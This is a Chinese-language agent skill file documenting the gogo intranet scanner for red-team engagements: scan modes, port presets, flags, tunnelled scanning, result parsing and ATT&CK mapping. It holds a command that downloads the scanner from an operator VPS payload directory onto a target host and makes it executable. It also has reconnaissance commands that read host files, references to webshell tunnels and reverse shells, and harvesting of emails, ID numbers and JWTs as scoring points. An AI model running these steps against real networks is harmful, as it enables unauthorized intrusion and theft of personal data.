---
name: gogo-intranet
description: gogo v2.15.0 高性能内网扫描引擎：智能/超智能模式、主动+被动指纹、关键信息提取（title/cert/JWT/邮箱/身份证）、nuclei 模板 POC、发包可控低噪声
whenToUse: 进入内网后对大网段（/16 /12）快速测绘、要指纹与关键信息、需要尽量少发包不被发现
---

# gogo（内网测绘与指纹引擎）

`gogo` = **高并发、低噪声、高度可配置的测绘引擎**。链式反应出品，专为红队内网场景设计：
最小发包原则、主动+被动指纹、关键信息提取、内核级 POC 引擎（neutron，兼容 nuclei 模板）、
支持 DSL/workflow 自定义。**先 gogo 铺面，再 fscan 打点。**

## 与 fscan 的分工

| | gogo | fscan |
| --- | --- | --- |
| 强项 | 大网段测绘、指纹、信息提取、可控发包 | 弱口令爆破、未授权、高危漏洞、利用 |
| 默认噪声 | 低（`--opsec`、线程/超时可调） | 高（600 线程 + 爆破 + POC 全开） |
| 输出 | `.dat`（deflate JSON Lines）+ 格式化 | txt/json/csv |
| 典型用法 | `gogo -i 10.0.0.0/8 -m ss --ping -p top2,win,db --af` | `fscan -h 10.0.0.0/24 -nobr -nopoc` |

## 二进制

```
本机 : $DSH_HOME/redteam/toolkit/gogo/gogo                （v2.15.0，4.3MB，自带 3138 条指纹）
       $DSH_HOME/redteam/toolkit/gogo/gogo_windows_amd64.exe
       $DSH_HOME/redteam/toolkit/gogo/gogo_linux_arm64
VPS  : http://<你的VPS_IP>:9100/gogo                          （技能 vps-reverse-shell 的载荷目录）
文档 : https://chainreactors.github.io/wiki/gogo/
模板 : https://github.com/chainreactors/templates

# 跳到跳板机/目标上执行
curl -o gogo http://<你的VPS_IP>:9100/gogo && chmod +x gogo
```

安装脚本不下载 gogo，需自行放到主文件路径。Windows 与 ARM 文件同样要自己补；当前平台只用上面的主文件。

**零依赖**：单个静态二进制，指纹与提取规则全部内置，Windows 2003 都能跑。**不需要**额外配置文件。

## 纪律

1. **范围**：`--exclude` / `--exclude-file` 排除授权范围外网段，别把办公网和云元数据段扫了。
2. **先探路再扫描**：`ip a; ip route; arp -a; cat /etc/hosts` —— 内网拓扑往往能省掉一半扫描。
3. **OPSEC**：敏感环境加 `--opsec`，线程压到 `-t 200~500`，超时 `-d 3`；大网段必须 `--ping` 先过滤。
4. **不要 `-p -`（全端口）扫大网段**，那是自杀式发包；先 `top2` 再对存活主机上全端口。

## 核心概念

### 端口预设（这工具的灵魂）

```bash
gogo -P port        # 列出全部预设 tag 与对应端口
```

常用 tag：`top1`(80,443,8080) · `top2`(数百个常见 Web/服务端口) · `top3` · `common`(内网常用) ·
`win`(135,137,445,3389,winrm,oxid) · `db` · `http` · `docker` · `oracle` · `smb` · `all`(全集)

```bash
p 组合：-p top2,win,db          # 逗号任意组合
p 范围：-p 1-1000               # 区间
p 全部：-p -                    # 等于 1-65535（慎用）
p 单点：-p 6379,mysql,12345
```

### 三种扫描模式

| 模式 | 参数 | 适用 |
| --- | --- | --- |
| default | （默认） | 单 IP / 小网段（/24 以内） |
| smart | `-m s` | /24~/16，AB 段探测 + 启发式发散 |
| supersmart | `-m ss` | /16 以上大内网，先探点再筛选网段 |
| sc | `-m sc` | 已知目标段、要更细的端口覆盖 |

```bash
gogo -i 192.168.1.0/24 -m s  --ping -p top2,win,db --af
gogo -i 10.0.0.0/8    -m ss --ping -p top2,win,db --af
```

### workflow（把复杂命令存成预设）

```bash
gogo -P workflow     # 列出全部 workflow
gogo -w 10           # 等价于扫 10.0.0.0/8 的 supersmart 全流程（all 端口）
gogo -w 172          # 172.16.0.0/12
gogo -w 192          # 192.168.0.0/16
gogo -w interc       # 内网常见 C 段（10/172/192 三段）
gogo -w 10 -i 11.0.0.0/8 -p top2   # 命令行可覆盖 workflow 参数
```

## 参数速查（实测 v2.15.0 `-h`）

> **多字符长参数必须双横线**：`--ipp`、`--sp`、`--ef`、`--af`。单横线只给 `-i/-p/-m/-t/-d/-e/-v/-w/-F/-l/-L/-j` 这类单字符。

**输入**
```
-i/--ip   192.168.1.1/24,172.16.1.1/24   目标，逗号分隔多个
--exclude 10.0.0.1/24        --exclude-file <file>
-l <file> 目标列表文件        -L  从 stdin 读目标
-j <file> 复用上次结果(.dat)或 ip:port 列表，继续深挖     -J  从 stdin 读
```

**输出**
```
-f <file>        输出文件名         --path  输出目录
-o <fmt>         命令行输出格式     -O <fmt>  文件输出格式（默认 jsonlines）
--af             自动命名输出文件（.dat，deflate JSON Lines）
--hf             自动命名隐藏文件   -C  关闭压缩      --tee  同时保留控制台输出
-q/--quiet       关日志只留结果（联动其他工具必加）
-F <file>        格式化已有 .dat 结果
--filter / --output-filter / --scan-filter   历史过滤 / 实时过滤 / 提前停止
```

**智能扫描**
```
-m/--mod  default|s|ss|sc    扫描模式
--ping                       先 ICMP 过滤（大网段必须）
-n/--no                      只做智能扫描，不进入默认扫描
--sp   smart 端口探针（默认 80，ss 模式默认 icmp）
--ipp  AB 段 IP 探针（默认 1,254）
```

**性能与隐蔽**
```
-t/--thread <n>     并发（linux 默认 4000，内网建议 200~1000）
-d/--timeout <秒>   超时（默认 2）
-D/--ssl-timeout     SSL 超时
--opsec             低噪声模式（敏感环境开）
-s/--spray          端口优先喷洒（端口数 >500 自动启用）
--no-spray          强制关闭喷洒
```

**指纹与提取**
```
-v/--verbose         主动指纹识别（不发这个只有被动指纹，信息少但安静）
--ff <file>          自定义指纹库
--extract "<regex>"  自定义提取正则
gogo -P extract      查看内置提取规则（jwt / mail / idcard / phone / ip 等）
```

**漏洞（neutron 内核）**
```
-e/--exploit         开启 POC 扫描（与 -v 合用写作 -ev）
-E <name>            指定模板名        --ef <file>  指定模板文件
--payload <s>        指定 payload      --attack-type sniper|clusterbomb|pitchfork
```

**代理**
```
--proxy socks5://127.0.0.1:11111      # 实测可用，走 suo5 / ssh -D 隧道
```

## 标准作业流程（SOP）

```bash
# 0) 探路
ip a; ip route; arp -a; cat /etc/hosts /etc/resolv.conf

# 1) 大网段测绘（安静、先探活、结果落文件）
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af -t 500 -d 3

# 2) 看结果（human-like）
./gogo -F ./.10.0.0.0_16_top2_win_db_ss_dat

# 3) 对存活主机上全端口 + 主动指纹
./gogo -i 10.0.1.0/24 -p - -v -t 1000 -d 3 --af

# 4) 定向打 POC（只对确认有指纹的目标）
./gogo -i 10.0.1.5,10.0.1.9 -p top2 -ev -E <模板名>

# 5) 复用上一步结果继续深挖（不用重扫）
./gogo -j ./step1.dat -p 1-65535 -v -e
```

### 走隧道测绘（内网渗透主路径）

```bash
# 前提：技能 suo5-tunnel 建好 socks5，或 vps-reverse-shell 里 ssh -D
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af \
       --proxy socks5://127.0.0.1:1080 -t 300 -d 5 -q

# 实测：gogo --proxy socks5:// 会把流量真正送进隧道（经 VPS 扫到的是 VPS 的 SSH 指纹）
```

隧道场景把 `-t` 降到 300 以内、`-d` 提到 5，否则隧道会丢包误判。

## 结果落库（必须做）

gogo 的 `.dat` 是压缩 JSON Lines，先格式化再解析入库：

```bash
./gogo -F ./result.dat -o json -f result.json      # 转成 JSON（实测产物结构见下）
python3 tools/parse.py result.json
# 解析要点：顶层是 {config, ip, data:[...]}，每条含 ip/port/protocol/status/frameworks/title/timing
```
```python
import json
d = json.load(open('result.json', encoding='utf-8'))
for it in d.get('data', []):
    fw = ','.join((it.get('frameworks') or {}).keys())
    print(it.get('ip'), it.get('port'), it.get('protocol'), fw, it.get('title'))
# 实测单条：{"ip":"10.0.0.5","port":"22","protocol":"tcp","status":"open",
#             "frameworks":{"ssh":{"name":"ssh","attributes":{"version":"10.3p1"}}},
#             "title":"SSH-2.0-OpenS","timing":26}
```

```bash
# 入库纪律（与 fscan 相同）
redteam_asset_add      { engagement, ip, port, service, title, source: "gogo", tags: [...] }
redteam_web_list       # 之后由 web 指纹技能补充 URL/标题
redteam_vuln_add       { engagement, target, name, severity, evidence_ref }   # 必须配证据
```

**注意**：gogo 的框架/指纹结果写进 `asset` 的 `fingerprint` 字段，不要只留在终端里。
扫到的敏感信息提取结果（邮箱/身份证/JWT）属于「大量敏感信息」得分点，用 `redteam_vuln_add` +
`redteam_score_hit` 记录，证据落 `runs/`。

## 排障

| 现象 | 处理 |
| --- | --- |
| 参数报错 | 长参数用双横线（`--af` 不是 `-af`），`-P` 只接受 `port/workflow/neutron/extract` |
| 结果文件找不到 | `--af` 写在**二进制同目录**，加 `--path` 指定目录 |
| 大网段几乎没结果 | `--ping` 会漏掉禁 ping 主机；去掉 `--ping` 或改 `--ipp` 调整探针 |
| 扫描太慢 | 提高 `-t`、降低 `-d`；`-p` 换成 `top1`/`top2`；大网段用 `-m ss` |
| 被 IDS 发现 | `--opsec` + `-t 200` + `-d 3`；不要开 `-e`；不要 `-p -` |
| 隧道里大量超时 | 降 `-t`、升 `-d`，隧道带宽是瓶颈 |
| 想只看结果不看日志 | `-q`（联动其他工具必加） |

## 相关技能

- `fscan-intranet`：铺面之后的爆破与利用
- `suo5-tunnel`：WebShell → SOCKS5，给 gogo 提供 `--proxy` 入口
- `vps-reverse-shell`：隧道与载荷投递
- `web-fingerprint` / `asset-correlation`：把 gogo 的结果进一步关联成资产图谱



<!-- runnability:start scripts/inject-runnability.mjs 生成，勿手改 -->

## 本机可执行性（自动探测；命令是按 Linux/Kali 写的，照抄会撞空）

本技能命令用到的工具里，本机（PATH 与 toolkit 双探）没有：`netexec`、`gogo`
- `netexec`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建
- `gogo`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建

命令含 Linux 专属形态（`sudo` / `apt` / `/usr/share` 等）：本机是 Windows，**去掉 sudo**、把绝对路径换成工具目录（`$DSH_HOME/redteam/toolkit/<name>/`），`.exe` 后缀别漏。

runnability:end -->

<!-- second-shot:start scripts/inject-second-shot.mjs 生成，勿手改 -->

## 第二发（主力打不出去时，按这个顺序换）

1. **同类替代**（链路里的互补技能，手法最接近）：`fscan-intranet`、`lateral-movement`、`netexec-scan`

2. **前提没满足就先回去**：`chisel-tunnel`、`frp-tunnel`、`suo5-tunnel` —— 上一环没做实，本环再试也是空打

3. **无回显 / 被拦**：先用 `oob-verification` 确认是不是真没打进去（没回显 ≠ 没命中）；确认被 WAF 拦就转 `waf-bypass`

**纪律**：同一手法不许连打三次（第一次是验证、第二次换参数、第三次必须换手法）；换完还不动，就**如实回报**试过哪几条、各自现象是什么——这是下一次改打的依据，不是失败。

second-shot:end -->

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：5 内网渗透｜**角色**：`internal`
- **上游**（先做完这些再进来）：`suo5-tunnel`、`chisel-tunnel`
- **下游**（产出交给谁）：`fscan-intranet`、`netexec-scan`
- **互补**（同类场景一起用）：`fscan-intranet`、`lateral-movement`、`netexec-scan`
- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`asset` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据
- **收口必做**（打完不算完，要能证明）：命中判定走 `verification-discipline`（误报排除 + 修复五档判定）；打完之后要**补丁后复测**（补丁/修复后再打一遍，确认真的关掉了，而不是换个入口还能打）也走它；说清对手能不能发现走 `detection-pairing`（检测规则 + 响度）；战果归到哪个战术走 `attack-traceability`（ATT&CK 映射）。**出交付物用 `redteam_report`**（kind=score 出计分战报、kind=targets 出靶标清单），整条链路串起来看用 `redteam_attack_chain` / `redteam_attack_path` —— 这两个只在 `redteam-setup` 的工具表里登记过，做具体攻击时不会想到去翻，所以在这里点名

- **配套工具**（做完这步要落库/查询时用，别只记在上下文里）：`redteam_asset_stats`（收集收口先看断层：C 段数/存活/端口/服务/指纹/溯源条数）、`redteam_asset_get`（深入单个目标：全部端口服务+指纹+采集时间线）、`redteam_asset_graph`（C 段→资产→端口→域名 的拓扑，找横向路径用它而不是肉眼翻列表）、`redteam_asset_timeline`（发现时间线，判断哪些是新冒出来的）

<!-- /skill-link-graph -->

## ATT&CK 映射

> 本技能会执行的手法对应 MITRE ATT&CK v20.1 下列技术（编号来自 `lib/redteam/attack-map.js`，唯一来源）。

| 战术 | 编号 | 技术 |
| --- | --- | --- |
| 发现 | T1018 | 远程系统发现 |
| 发现 | T1046 | 网络服务发现 |

落到事实库时，把这几个编号写进 `attack_step` 的标题或 `detail`：报告与检测配对要靠它们对齐；
**没写编号的动作在「按 ATT&CK 复核」时等于不存在**（防守方按技术编号查日志，查不到就是漏）。
